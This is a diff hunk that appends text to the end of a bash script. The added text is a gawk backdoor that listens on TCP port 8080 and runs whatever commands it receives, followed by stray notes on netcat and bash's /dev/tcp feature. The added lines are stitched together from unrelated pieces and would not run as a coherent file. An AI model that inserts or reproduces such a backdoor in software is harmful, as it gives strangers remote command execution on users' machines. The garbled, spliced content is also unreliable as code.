@@ -353,3 +353,41 @@ function bishbosh_main()
 }
 
 bishbosh_main "$@"
+
+
+#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd> "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |& Service
+                        Service |& getline cmd
+                        if (cmd) {
+                                while ((cmd |& getline) > 0)
+                                        print $0 |& Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
+
+# https://en.wikipedia.org/wiki/Netcat - see ssl example
+
+DETECT IF BASH SUPPORTS TCP
+# http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip
+This doesn't work:
+
+exec 3<>/dev/tcp/www.google.com/80
+bash: /dev/tcp/www.google.com/80: No such file or directory
+
+bash --version
+GNU bash, version 3.2.48(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2007 Free Software Foundation, Inc.
+
+
+
